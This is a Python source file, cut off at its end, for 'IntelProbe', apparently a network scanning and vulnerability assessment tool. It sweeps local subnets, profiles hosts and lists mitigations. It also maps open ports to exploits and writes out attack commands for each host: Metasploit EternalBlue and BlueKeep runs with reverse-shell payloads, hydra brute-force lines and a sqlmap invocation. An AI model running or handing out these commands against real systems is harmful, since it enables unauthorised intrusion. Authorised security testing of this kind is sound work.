#!/usr/bin/env python3
"""
IntelProbe Advanced Multi-Threaded Network Security Platform
Military-grade reconnaissance, vulnerability assessment, and network defense

Author: Lintshiwe Slade (@lintshiwe)
Enhanced from netspionage framework with AI-powered capabilities
"""

import threading
import queue
import time
import json
import os
import sys
import socket
import subprocess
import ipaddress
import platform
import concurrent.futures
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple
import logging
from enum import Enum

class ThreatLevel(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

@dataclass
class DeviceProfile:
    """Comprehensive device profile with sensitive information"""
    ip: str
    hostname: Optional[str] = None
    mac_address: Optional[str] = None
    vendor: Optional[str] = None
    os_type: Optional[str] = None
    os_version: Optional[str] = None
    computer_name: Optional[str] = None
    domain: Optional[str] = None
    logged_users: List[str] = None
    shares: List[str] = None
    services: Dict[int, Dict] = None
    open_ports: List[int] = None
    vulnerabilities: List[Dict] = None
    exploits: List[Dict] = None
    credentials: List[Dict] = None
    sensitive_files: List[str] = None
    network_interfaces: List[Dict] = None
    installed_software: List[str] = None
    running_processes: List[str] = None
    threat_level: ThreatLevel = ThreatLevel.INFO
    mitigation_steps: List[str] = None
    last_scan: str = None
    
    def __post_init__(self):
        if self.logged_users is None:
            self.logged_users = []
        if self.shares is None:
            self.shares = []
        if self.services is None:
            self.services = {}
        if self.open_ports is None:
            self.open_ports = []
        if self.vulnerabilities is None:
            self.vulnerabilities = []
        if self.exploits is None:
            self.exploits = []
        if self.credentials is None:
            self.credentials = []
        if self.sensitive_files is None:
            self.sensitive_files = []
        if self.network_interfaces is None:
            self.network_interfaces = []
        if self.installed_software is None:
            self.installed_software = []
        if self.running_processes is None:
            self.running_processes = []
        if self.mitigation_steps is None:
            self.mitigation_steps = []

class AdvancedNetworkScanner:
    """
    Advanced multi-threaded network security platform
    """
    
    def __init__(self, max_workers=50):
        self.max_workers = max_workers
        self.scan_queue = queue.Queue()
        self.vulnerability_queue = queue.Queue()
        self.results_queue = queue.Queue()
        self.threat_queue = queue.Queue()
        
        self.discovered_devices = {}
        self.active_threats = []
        self.scanning_active = False
        
        self.logger = self._setup_logger()
        self.exploitation_db = self._load_exploitation_database()
        self.mitigation_db = self._load_mitigation_database()
        
        # Network defense capabilities
        self.defensive_mode = False
        self.blocked_devices = set()
        
    def _setup_logger(self):
        """Setup comprehensive logging"""
        logger = logging.getLogger("advanced_scanner")
        logger.setLevel(logging.INFO)
        
        if not logger.handlers:
            # File handler
            os.makedirs("logs", exist_ok=True)
            file_handler = logging.FileHandler(f"logs/intelprobe_{int(time.time())}.log")
            file_formatter = logging.Formatter(
                '%(asctime)s [%(levelname)s] %(name)s: %(message)s'
            )
            file_handler.setFormatter(file_formatter)
            logger.addHandler(file_handler)
            
            # Console handler
            console_handler = logging.StreamHandler()
            console_formatter = logging.Formatter('%(asctime)s [%(levelname)s]: %(message)s')
            console_handler.setFormatter(console_formatter)
            logger.addHandler(console_handler)
        
        return logger
    
    def _load_exploitation_database(self) -> Dict:
        """Load comprehensive exploitation database"""
        return {
            "SMB": {
                "ports": [139, 445],
                "exploits": [
                    {
                        "name": "EternalBlue (MS17-010)",
                        "cve": "CVE-2017-0144",
                        "severity": "CRITICAL",
                        "tools": ["metasploit", "AutoBlue-MS17-010", "worawit/MS17-010"],
                        "payloads": ["windows/x64/meterpreter/reverse_tcp", "windows/shell_reverse_tcp"],
                        "description": "Remote code execution via SMB vulnerability",
                        "impact": "Full system compromise, lateral movement, data exfiltration"
                    },
                    {
                        "name": "SMBGhost (CVE-2020-0796)",
                        "cve": "CVE-2020-0796",
                        "severity": "CRITICAL",
                        "tools": ["metasploit", "chompie1337/SMBGhost_RCE_PoC"],
                        "payloads": ["windows/x64/meterpreter/reverse_tcp"],
                        "description": "Windows 10 SMBv3 compression vulnerability",
                        "impact": "Remote code execution with SYSTEM privileges"
                    }
                ]
            },
            "RDP": {
                "ports": [3389],
                "exploits": [
                    {
                        "name": "BlueKeep (CVE-2019-0708)",
                        "cve": "CVE-2019-0708",
                        "severity": "CRITICAL",
                        "tools": ["metasploit", "bluekeep-scanner", "zerosum0x0/CVE-2019-0708"],
                        "payloads": ["windows/x64/meterpreter/reverse_tcp"],
                        "description": "Remote desktop services vulnerability",
                        "impact": "Wormable vulnerability allowing remote code execution"
                    },
                    {
                        "name": "RDP Brute Force",
                        "cve": "N/A",
                        "severity": "HIGH",
                        "tools": ["hydra", "crowbar", "ncrack", "medusa"],
                        "payloads": ["credential harvesting"],
                        "description": "Brute force RDP credentials",
                        "impact": "Unauthorized access to remote desktop"
                    }
                ]
            },
            "SSH": {
                "ports": [22],
                "exploits": [
                    {
                        "name": "SSH Brute Force",
                        "cve": "N/A",
                        "severity": "HIGH",
                        "tools": ["hydra", "medusa", "patator", "ncrack"],
                        "payloads": ["credential harvesting", "shell access"],
                        "description": "Brute force SSH credentials",
                        "impact": "Unauthorized shell access"
                    },
                    {
                        "name": "SSH Key Exploitation",
                        "cve": "N/A",
                        "severity": "HIGH",
                        "tools": ["ssh-keyscan", "paramiko", "custom scripts"],
                        "payloads": ["shell access", "lateral movement"],
                        "description": "Exploit weak SSH key configurations",
                        "impact": "Persistent access via compromised keys"
                    }
                ]
            },
            "HTTP": {
                "ports": [80, 8080, 8000, 8888],
                "exploits": [
                    {
                        "name": "SQL Injection",
                        "cve": "Various",
                        "severity": "HIGH",
                        "tools": ["sqlmap", "sqlninja", "havij", "burp suite"],
                        "payloads": ["database extraction", "webshell upload"],
                        "description": "SQL injection vulnerabilities",
                        "impact": "Database compromise, data exfiltration"
                    },
                    {
                        "name": "Remote File Inclusion",
                        "cve": "Various",
                        "severity": "HIGH",
                        "tools": ["fimap", "kadimus", "dotdotpwn"],
                        "payloads": ["webshell execution", "local file inclusion"],
                        "description": "File inclusion vulnerabilities",
                        "impact": "Remote code execution, sensitive file access"
                    }
                ]
            },
            "FTP": {
                "ports": [21],
                "exploits": [
                    {
                        "name": "Anonymous FTP Access",
                        "cve": "N/A",
                        "severity": "MEDIUM",
                        "tools": ["ftp", "curl", "wget", "lftp"],
                        "payloads": ["file download", "directory traversal"],
                        "description": "Anonymous FTP access enabled",
                        "impact": "Sensitive file exposure, potential upload access"
                    },
                    {
                        "name": "FTP Brute Force",
                        "cve": "N/A",
                        "severity": "MEDIUM",
                        "tools": ["hydra", "medusa", "patator"],
                        "payloads": ["credential harvesting", "file access"],
                        "description": "Brute force FTP credentials",
                        "impact": "Unauthorized file system access"
                    }
                ]
            },
            "TELNET": {
                "ports": [23],
                "exploits": [
                    {
                        "name": "Telnet Credential Interception",
                        "cve": "N/A",
                        "severity": "HIGH",
                        "tools": ["wireshark", "tcpdump", "ettercap"],
                        "payloads": ["credential harvesting"],
                        "description": "Unencrypted telnet traffic",
                        "impact": "Credential interception, session hijacking"
                    }
                ]
            },
            "VNC": {
                "ports": [5900, 5901, 5902],
                "exploits": [
                    {
                        "name": "VNC Authentication Bypass",
                        "cve": "Various",
                        "severity": "HIGH",
                        "tools": ["vnccrack", "medusa", "patator"],
                        "payloads": ["desktop access"],
                        "description": "Weak or no VNC authentication",
                        "impact": "Full desktop access, screen monitoring"
                    }
                ]
            },
            "SNMP": {
                "ports": [161],
                "exploits": [
                    {
                        "name": "SNMP Community String Brute Force",
                        "cve": "N/A",
                        "severity": "MEDIUM",
                        "tools": ["onesixtyone", "snmpwalk", "snmp-check"],
                        "payloads": ["system information extraction"],
                        "description": "Weak SNMP community strings",
                        "impact": "System information disclosure, configuration access"
                    }
                ]
            }
        }
    
    def _load_mitigation_database(self) -> Dict:
        """Load mitigation strategies database"""
        return {
            "SMB": [
                "Apply MS17-010 security update immediately",
                "Disable SMBv1 protocol completely",
                "Enable SMB signing and encryption",
                "Implement network segmentation",
                "Use Windows Firewall to restrict SMB access",
                "Monitor SMB traffic for anomalies",
                "Regular vulnerability scanning"
            ],
            "RDP": [
                "Enable Network Level Authentication (NLA)",
                "Use strong, complex passwords",
                "Implement account lockout policies",
                "Change default RDP port (3389)",
                "Use VPN for remote access",
                "Enable RDP encryption",
                "Monitor failed login attempts",
                "Implement multi-factor authentication"
            ],
            "SSH": [
                "Disable password authentication, use keys only",
                "Use strong SSH key passphrases",
                "Change default SSH port (22)",
                "Implement fail2ban or similar",
                "Disable root login",
                "Use SSH protocol version 2 only",
                "Regular key rotation",
                "Monitor SSH logs for anomalies"
            ],
            "HTTP": [
                "Implement HTTPS with strong certificates",
                "Use Web Application Firewalls (WAF)",
                "Regular security updates",
                "Input validation and sanitization",
                "Implement CSRF protection",
                "Use secure session management",
                "Regular penetration testing",
                "Implement Content Security Policy (CSP)"
            ],
            "FTP": [
                "Replace with SFTP or FTPS",
                "Disable anonymous access",
                "Use strong authentication",
                "Implement IP restrictions",
                "Regular log monitoring",
                "Use passive mode only",
                "Implement file integrity monitoring"
            ],
            "TELNET": [
                "Replace with SSH immediately",
                "Disable telnet service completely",
                "Use encrypted alternatives",
                "Network segmentation",
                "Monitor for telnet usage"
            ],
            "VNC": [
                "Use strong VNC passwords",
                "Enable encryption",
                "Use VPN tunneling",
                "Implement IP restrictions",
                "Regular password changes",
                "Monitor VNC connections",
                "Use more secure alternatives like RDP with NLA"
            ],
            "SNMP": [
                "Change default community strings",
                "Use SNMPv3 with encryption",
                "Implement access control lists",
                "Disable SNMP if not needed",
                "Monitor SNMP requests",
                "Use strong authentication"
            ]
        }
    
    def discover_networks(self) -> List[str]:
        """Discover all connected networks"""
        networks = []
        
        try:
            if platform.system() == "Windows":
                # Get routing table
                result = subprocess.run(["route", "print"], capture_output=True, text=True, timeout=10)
                lines = result.stdout.split('\n')
                
                for line in lines:
                    if "0.0.0.0" in line and "0.0.0.0" in line:
                        # Default route line
                        parts = line.split()
                        if len(parts) >= 3:
                            gateway = parts[2]
                            # Determine network from gateway
                            try:
                                gw_ip = ipaddress.ip_address(gateway)
                                if gw_ip.is_private:
                                    octets = str(gw_ip).split('.')
                                    network = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
                                    if network not in networks:
                                        networks.append(network)
                            except:
                                pass
                
                # Also check ipconfig for additional networks
                result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
                current_subnet = None
                
                for line in result.stdout.split('\n'):
                    if "IPv4 Address" in line:
                        try:
                            ip = line.split(":")[1].strip()
                            if not ip.startswith("127.") and not ip.startswith("169.254"):
                                octets = ip.split('.')
                                network = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
                                if network not in networks:
                                    networks.append(network)
                        except:
                            pass
            
            else:
                # Linux/macOS
                result = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if "/" in line and "src" in line:
                        parts = line.split()
                        if len(parts) > 0 and "/" in parts[0]:
                            network = parts[0]
                            if not network.startswith("127.") and not network.startswith("169.254"):
                                networks.append(network)
                                
        except Exception as e:
            self.logger.error(f"Network discovery error: {e}")
            # Fallback to common networks
            networks = ["192.168.1.0/24", "192.168.0.0/24", "10.0.0.0/24", "172.16.0.0/24"]
        
        self.logger.info(f"Discovered networks: {networks}")
        return networks
    
    def deep_device_scan(self, target_ip: str) -> Optional[DeviceProfile]:
        """Perform comprehensive device profiling"""
        self.logger.info(f"Deep scanning device: {target_ip}")
        
        device = DeviceProfile(ip=target_ip)
        device.last_scan = time.strftime("%Y-%m-%d %H:%M:%S")
        
        # Multi-threaded information gathering
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            tasks = {
                executor.submit(self._scan_ports, target_ip): "ports",
                executor.submit(self._gather_hostname, target_ip): "hostname",
                executor.submit(self._gather_os_info, target_ip): "os",
                executor.submit(self._gather_smb_info, target_ip): "smb",
                executor.submit(self._gather_snmp_info, target_ip): "snmp",
                executor.submit(self._gather_web_info, target_ip): "web",
                executor.submit(self._scan_vulnerabilities, target_ip): "vulns"
            }
            
            for future in concurrent.futures.as_completed(tasks):
                task_type = tasks[future]
                try:
                    result = future.result(timeout=30)
                    self._process_scan_result(device, task_type, result)
                except Exception as e:
                    self.logger.debug(f"Task {task_type} failed for {target_ip}: {e}")
        
        # Generate exploitation recommendations
        device.exploits = self._generate_exploitation_plan(device)
        
        # Assess threat level
        device.threat_level = self._assess_threat_level(device)
        
        # Generate mitigation steps
        device.mitigation_steps = self._generate_mitigation_steps(device)
        
        return device
    
    def _scan_ports(self, target_ip: str) -> Dict:
        """Comprehensive port scanning"""
        ports_to_scan = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 
            993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 5901, 5902, 6379, 8000, 
            8080, 8443, 8888, 9090, 27017
        ]
        
        open_ports = []
        services = {}
        
        for port in ports_to_scan:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target_ip, port))
                
                if result == 0:
                    open_ports.append(port)
                    
                    # Service detection
                    try:
                        sock.send(b"GET / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
                        services[port] = {
                            "service": self._identify_service(port, banner),
                            "banner": banner[:200],
                            "version": self._extract_version(banner)
                        }
                    except:
                        services[port] = {
                            "service": self._identify_service(port, ""),
                            "banner": "",
                            "version": "Unknown"
                        }
                
                sock.close()
            except Exception as e:
                pass
        
        return {"open_ports": open_ports, "services": services}
    
    def _gather_hostname(self, target_ip: str) -> str:
        """Gather hostname information"""
        try:
            hostname = socket.gethostbyaddr(target_ip)[0]
            return hostname
        except:
            return None
    
    def _gather_os_info(self, target_ip: str) -> Dict:
        """Advanced OS detection"""
        os_info = {"os_type": "Unknown", "os_version": "Unknown", "computer_name": None}
        
        try:
            # TTL-based OS detection
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["ping", "-n", "1", target_ip], 
                    capture_output=True, text=True, timeout=5
                )
            else:
                result = subprocess.run(
                    ["ping", "-c", "1", target_ip], 
                    capture_output=True, text=True, timeout=5
                )
            
            if "TTL=" in result.stdout or "ttl=" in result.stdout:
                ttl_line = [line for line in result.stdout.split('\n') if 'TTL=' in line or 'ttl=' in line]
                if ttl_line:
                    ttl = ttl_line[0]
                    if "128" in ttl or "127" in ttl:
                        os_info["os_type"] = "Windows"
                    elif "64" in ttl or "63" in ttl:
                        os_info["os_type"] = "Linux/Unix"
                    elif "255" in ttl or "254" in ttl:
                        os_info["os_type"] = "Network Device"
        except:
            pass
        
        return os_info
    
    def _gather_smb_info(self, target_ip: str) -> Dict:
        """Gather SMB/NetBIOS information"""
        smb_info = {
            "shares": [],
            "users": [],
            "computer_name": None,
            "domain": None,
            "os_version": None
        }
        
        try:
            # Try to get NetBIOS information
            if platform.system() == "Windows":
                # Use nbtstat
                result = subprocess.run(
                    ["nbtstat", "-A", target_ip], 
                    capture_output=True, text=True, timeout=10
                )
                
                for line in result.stdout.split('\n'):
                    if "<00>" in line and "UNIQUE" in line:
                        smb_info["computer_name"] = line.split()[0].strip()
                    elif "<1D>" in line and "UNIQUE" in line:
                        smb_info["domain"] = line.split()[0].strip()
            
            # Try to enumerate shares
            try:
                if platform.system() == "Windows":
                    result = subprocess.run(
                        ["net", "view", f"\\\\{target_ip}"], 
                        capture_output=True, text=True, timeout=10
                    )
                    
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if line.strip() and not line.startswith("The command") and "Share name" not in line:
                            if line.strip().split():
                                share_name = line.strip().split()[0]
                                if share_name and not share_name.startswith("-"):
                                    smb_info["shares"].append(share_name)
            except:
                pass
                
        except Exception as e:
            self.logger.debug(f"SMB info gathering failed for {target_ip}: {e}")
        
        return smb_info
    
    def _gather_snmp_info(self, target_ip: str) -> Dict:
        """Gather SNMP information"""
        snmp_info = {
            "community_strings": [],
            "system_info": {},
            "interfaces": []
        }
        
        # Try common community strings
        common_communities = ["public", "private", "community", "manager", "admin"]
        
        for community in common_communities:
            try:
                # Simple SNMP check (would require pysnmp for full implementation)
                # This is a placeholder for SNMP enumeration
                pass
            except:
                pass
        
        return snmp_info
    
    def _gather_web_info(self, target_ip: str) -> Dict:
        """Gather web server information"""
        web_info = {
            "servers": [],
            "technologies": [],
            "directories": [],
            "vulnerabilities": []
        }
        
        web_ports = [80, 443, 8000, 8080, 8443, 8888]
        
        for port in web_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if sock.connect_ex((target_ip, port)) == 0:
                    # Send HTTP request
                    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
                    sock.send(request.encode())
                    response = sock.recv(4096).decode('utf-8', errors='ignore')
                    
                    # Extract server information
                    if "Server:" in response:
                        server_line = [line for line in response.split('\n') if 'Server:' in line]
                        if server_line:
                            server = server_line[0].split('Server:')[1].strip()
                            web_info["servers"].append(f"Port {port}: {server}")
                    
                    # Check for common vulnerabilities
                    if "apache" in response.lower():
                        web_info["technologies"].append("Apache")
                    if "nginx" in response.lower():
                        web_info["technologies"].append("Nginx")
                    if "iis" in response.lower():
                        web_info["technologies"].append("IIS")
                
                sock.close()
            except:
                pass
        
        return web_info
    
    def _scan_vulnerabilities(self, target_ip: str) -> List[Dict]:
        """Scan for known vulnerabilities"""
        vulnerabilities = []
        
        # Check for common vulnerabilities based on open ports
        # This would integrate with vulnerability databases
        
        return vulnerabilities
    
    def _process_scan_result(self, device: DeviceProfile, task_type: str, result):
        """Process scan results and update device profile"""
        if task_type == "ports" and result:
            device.open_ports = result.get("open_ports", [])
            device.services = result.get("services", {})
        elif task_type == "hostname" and result:
            device.hostname = result
        elif task_type == "os" and result:
            device.os_type = result.get("os_type")
            device.os_version = result.get("os_version")
            device.computer_name = result.get("computer_name")
        elif task_type == "smb" and result:
            device.shares = result.get("shares", [])
            device.logged_users = result.get("users", [])
            if result.get("computer_name"):
                device.computer_name = result["computer_name"]
            if result.get("domain"):
                device.domain = result["domain"]
        elif task_type == "vulns" and result:
            device.vulnerabilities = result
    
    def _identify_service(self, port: int, banner: str) -> str:
        """Identify service based on port and banner"""
        service_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS",
            143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
            6379: "Redis", 8080: "HTTP-Alt", 27017: "MongoDB"
        }
        
        base_service = service_map.get(port, "Unknown")
        
        # Enhance with banner information
        if banner:
            banner_lower = banner.lower()
            if "apache" in banner_lower:
                return f"{base_service} (Apache)"
            elif "nginx" in banner_lower:
                return f"{base_service} (Nginx)"
            elif "iis" in banner_lower:
                return f"{base_service} (IIS)"
            elif "openssh" in banner_lower:
                return f"{base_service} (OpenSSH)"
            elif "microsoft" in banner_lower:
                return f"{base_service} (Microsoft)"
        
        return base_service
    
    def _extract_version(self, banner: str) -> str:
        """Extract version information from banner"""
        if not banner:
            return "Unknown"
        
        # Simple version extraction patterns
        import re
        version_patterns = [
            r'(\d+\.\d+\.\d+)',
            r'(\d+\.\d+)',
            r'Server: ([^\r\n]+)',
            r'SSH-(\d+\.\d+)'
        ]
        
        for pattern in version_patterns:
            match = re.search(pattern, banner)
            if match:
                return match.group(1)
        
        return "Unknown"
    
    def _generate_exploitation_plan(self, device: DeviceProfile) -> List[Dict]:
        """Generate detailed exploitation plan"""
        exploits = []
        
        for port in device.open_ports:
            service_info = device.services.get(port, {})
            service = service_info.get("service", "Unknown")
            
            # Check exploitation database
            for service_type, exploit_data in self.exploitation_db.items():
                if port in exploit_data["ports"] or service_type.lower() in service.lower():
                    for exploit in exploit_data["exploits"]:
                        exploit_plan = exploit.copy()
                        exploit_plan["target_port"] = port
                        exploit_plan["target_service"] = service
                        exploit_plan["command_examples"] = self._generate_exploit_commands(
                            device.ip, port, exploit
                        )
                        exploits.append(exploit_plan)
        
        return exploits
    
    def _generate_exploit_commands(self, target_ip: str, port: int, exploit: Dict) -> List[str]:
        """Generate specific exploit commands"""
        commands = []
        
        if "metasploit" in exploit["tools"]:
            if "EternalBlue" in exploit["name"]:
                commands.append(f"use exploit/windows/smb/ms17_010_eternalblue")
                commands.append(f"set RHOSTS {target_ip}")
                commands.append(f"set payload windows/x64/meterpreter/reverse_tcp")
                commands.append(f"set LHOST [your_ip]")
                commands.append(f"exploit")
            elif "BlueKeep" in exploit["name"]:
                commands.append(f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce")
                commands.append(f"set RHOSTS {target_ip}")
                commands.append(f"exploit")
        
        if "hydra" in exploit["tools"]:
            if port == 22:  # SSH
                commands.append(f"hydra -L userlist.txt -P passwordlist.txt ssh://{target_ip}")
            elif port == 3389:  # RDP
                commands.append(f"hydra -L userlist.txt -P passwordlist.txt rdp://{target_ip}")
            elif port == 21:  # FTP
                commands.append(f"hydra -L userlist.txt -P passwordlist.txt ftp://{target_ip}")
        
        if "sqlmap" in exploit["tools"]:
            commands.append(f"sqlmap -u http://{target_ip}:{port}/vulnerable_page.php?id=1 --dbs")
        
        if "nmap" in exploit["tools"]:
            commands.append(f"nmap --script vuln {target_ip} -p {port}")
        
        return commands
    
    def _assess_threat_level(self, device: DeviceProfile) -> ThreatLevel:
        """Assess overall threat level"""
        score = 0
        
        # Critical vulnerabilities
        critical_ports = [445, 3389, 139]  # SMB, RDP, NetBIOS
        for port in device.open_ports:
            if port in critical_ports:
                score += 30
        
        # High-risk services
        high_risk_ports = [21, 23, 161, 5900]  # FTP, Telnet, SNMP, VNC
        for port in device.open_ports:
            if port in high_risk_ports:
                score += 20
        
        # Number of open ports
        score += len(device.open_ports) * 2
        
        # Exploits available
        critical_exploits = [e for e in device.exploits if e.get("severity") == "CRITICAL"]
        high_exploits = [e for e in device.exploits if e.get("severity") == "HIGH"]
        
        score += len(critical_exploits) * 25
        score += len(high_exploits) * 15
        
        # Determine threat level
        if score >= 80:
            return ThreatLevel.CRITICAL
        elif score >= 60:
            return ThreatLevel.HIGH
        elif score >= 30:
            return ThreatLevel.MEDIUM
        elif score > 0:
            return ThreatLevel.LOW
        else:
            return ThreatLevel.INFO
    
    def _generate_mitigation_steps(self, device: DeviceProfile) -> List[str]:
        """Generate specific mitigation steps"""
        steps = []
        
        for port in device.open_ports:
            service_info = device.services.get(port, {})
            service = service_info.get("service", "Unknown")
            
            # Get mitigation steps from database
            for service_type, mitigations in self.mitigation_db.items():
                if service_type.lower() in service.lower():
                    steps.extend([f"{service_type}: {step}" for step in mitigations])
        
        # General recommendations
        if device.threat_level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]:
            steps.insert(0, "🚨 IMMEDIATE ACTION REQUIRED - High threat level detected")
            steps.append("Isolate device from network until patches applied")
            steps.append("Implement network monitoring for this device")
        
        return list(set(steps))  # Remove duplicates
    
    def start_multitasking_scan(self, networks: List[str]):
        """Start multi-threaded comprehensive network scan"""
        print("=" * 80)
        print("           INTELPROBE MULTITASKING SECURITY PLATFORM")
        print("")
        print("  Real-time Network Reconnaissance & Vulnerability Assessment")
        print("  Exploitation Intelligence & Defense Capabilities")
        print("  Automated Threat Detection & Mitigation")
        print("")
        print("                  Created by: Lintshiwe Slade")
        print("                     GitHub: @lintshiwe")
        print("=" * 80)
        
        self.scanning_active = True
        
        # Start worker threads
        scanner_thread = threading.Thread(target=self._scanner_worker, args=(networks,))
        vulnerability_thread = threading.Thread(target=self._vulnerability_worker)
        threat_monitor_thread = threading.Thread(target=self._threat_monitor_worker)
        defense_thread = threading.Thread(target=self._defense_worker)
        
        # Make threads daemon so they don't prevent program exit
        scanner_thread.daemon = True
        vulnerability_thread.daemon = True
        threat_monitor_thread.daemon = True
        defense_thread.daemon = True
        
        scanner_thread.start()
        vulnerability_thread.start()
        threat_monitor_thread.start()
        defense_thread.start()
        
        # Wait for scanner to complete
        scanner_thread.join()
        
        # Give other threads time to finish processing remaining items
        print("⏳ Waiting for analysis threads to complete...")
        vulnerability_thread.join(timeout=10)
        threat_monitor_thread.join(timeout=10)
        defense_thread.join(timeout=10)
        
        print("✅ All scanning threads completed")
    
    def _scanner_worker(self, networks: List[str]):
        """Worker thread for network scanning"""
        print("\n🌐 PHASE 1: NETWORK DISCOVERY & RECONNAISSANCE")
        print("=" * 80)
        
        for network in networks:
            print(f"\n🔍 Scanning network: {network}")
            
            try:
                net = ipaddress.ip_network(network, strict=False)
                targets = [str(ip) for ip in net.hosts()][:50]  # Limit for demo
                
                print(f"📡 Scanning {len(targets)} potential targets...")
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                    futures = {executor.submit(self.deep_device_scan, target): target for target in targets}
                    
                    for future in concurrent.futures.as_completed(futures):
                        target = futures[future]
                        try:
                            device = future.result(timeout=60)
                            if device and device.open_ports:
                                self.discovered_devices[target] = device
                                self.vulnerability_queue.put(device)
                                print(f"✅ Active device: {target} ({len(device.open_ports)} ports)")
                        except Exception as e:
                            self.logger.debug(f"Scan failed for {target}: {e}")
                            
            except Exception as e:
                self.logger.error(f"Network scan error for {network}: {e}")
        
        print(f"\n📊 Discovery complete: {len(self.discovered_devices)} active devices found")
        
        # Signal that scanning is complete
        self.scanning_active = False
        print("🔄 Scanning phase complete, finalizing analysis...")
    
    def _vulnerability_worker(self):
        """Worker thread for vulnerability assessment"""
        print("\n🛡️ PHASE 2: VULNERABILITY ASSESSMENT & EXPLOITATION ANALYSIS")
        print("=" * 80)
        
        empty_queue_count = 0
        max_empty_cycles = 5  # Exit after 5 empty queue cycles when scanning is done
        
        while self.scanning_active or (not self.vulnerability_queue.empty() and empty_queue_count < max_empty_cycles):
            try:
                device = self.vulnerability_queue.get(timeout=5)
                empty_queue_count = 0  # Reset counter when we get an item
                
                print(f"\n🔬 Analyzing vulnerabilities for {device.ip}")
                print(f"   Computer: {device.computer_name or 'Unknown'}")
                print(f"   OS: {device.os_type or 'Unknown'}")
                print(f"   Threat Level: {device.threat_level.value}")
                
                if device.exploits:
                    print(f"   ⚔️ Exploitation opportunities: {len(device.exploits)}")
                    for exploit in device.exploits[:3]:  # Show top 3
                        print(f"      • {exploit['name']} ({exploit['severity']})")
                        if exploit.get('command_examples'):
                            print(f"        Tools: {', '.join(exploit['tools'][:3])}")
                
                if device.threat_level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]:
                    self.threat_queue.put(device)
                
                self.vulnerability_queue.task_done()
                
            except queue.Empty:
                if not self.scanning_active:
                    empty_queue_count += 1
                continue
            except Exception as e:
                self.logger.error(f"Vulnerability analysis error: {e}")
        
        print("🛡️ Vulnerability assessment completed")
    
    def _threat_monitor_worker(self):
        """Worker thread for threat monitoring"""
        print("\n🚨 PHASE 3: THREAT MONITORING & INTELLIGENCE")
        print("=" * 80)
        
        empty_queue_count = 0
        max_empty_cycles = 5  # Exit after 5 empty queue cycles when scanning is done
        
        while self.scanning_active or (not self.threat_queue.empty() and empty_queue_count < max_empty_cycles):
            try:
                device = self.threat_queue.get(timeout=5)
                empty_queue_count = 0  # Reset counter when we get an item
                
                print(f"\n🚨 HIGH THREAT DETECTED: {device.ip}")
                print(f"   💻 Computer: {device.computer_name or 'Unknown'}")
                print(f"   🖥️ OS: {device.os_type or 'Unknown'}")
                print(f"   ⚠️ Threat Level: {device.threat_level.value}")
                print(f"   🔌 Open Ports: {', '.join(map(str, device.open_ports))}")
                
                if device.shares:
                    print(f"   📁 SMB Shares: {', '.join(device.shares[:5])}")
                
                print(f"   ⚔️ Exploitation Vectors:")
                for exploit in device.exploits[:5]:
                    print(f"      🔴 {exploit['name']} ({exploit['severity']})")
                    print(f"         Impact: {exploit.get('impact', 'Unknown')}")
                    print(f"         Tools: {', '.join(exploit['tools'][:3])}")
                
                print(f"   🛡️ Mitigation Steps:")
                for step in device.mitigation_steps[:5]:
                    print(f"      • {step}")
                
                self.active_threats.append(device)
                self.threat_queue.task_done()
                
            except queue.Empty:
                if not self.scanning_active:
                    empty_queue_count += 1
                continue
            except Exception as e:
                self.logger.error(f"Threat monitoring error: {e}")
        
        print("🚨 Threat monitoring completed")
    
    def _defense_worker(self):
        """Worker thread for defensive actions"""
        print("\n🛡️ PHASE 4: AUTOMATED DEFENSE & MITIGATION")
        print("=" * 80)
        
        defense_cycles = 0
        max_cycles = 10  # Limit defense monitoring cycles
        
        while self.scanning_active and defense_cycles < max_cycles:
            try:
                # Monitor for critical threats
                critical_devices = [d for d in self.active_threats 
                                  if d.threat_level == ThreatLevel.CRITICAL]
                
                if critical_devices and not self.defensive_mode:
                    print(f"\n🚨 CRITICAL THREATS DETECTED: {len(critical_devices)} devices")
                    print("🛡️ Activating defensive measures...")
                    self.defensive_mode = True
                    
                    for device in critical_devices:
                        print(f"   🔒 Implementing protection for {device.ip}")
                        # In a real implementation, this would:
                        # - Block traffic to/from the device
                        # - Alert administrators
                        # - Implement firewall rules
                        # - Isolate the device
                
                time.sleep(3)  # Check every 3 seconds instead of 10
                defense_cycles += 1
                
            except Exception as e:
                self.logger.error(f"Defense worker error: {e}")
                break
        
        print("🛡️ Defense monitoring completed")
    
    def generate_comprehensive_report(self):
        """Generate comprehensive security report"""
        print("\n📊 GENERATING COMPREHENSIVE SECURITY REPORT")
        print("=" * 80)
        
        report = {
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "scanner": "IntelProbe Multitasking Security Platform",
            "author": "Lintshiwe Slade (@lintshiwe)",
            "summary": {
                "total_devices": len(self.discovered_devices),
                "critical_threats": len([d for d in self.discovered_devices.values() 
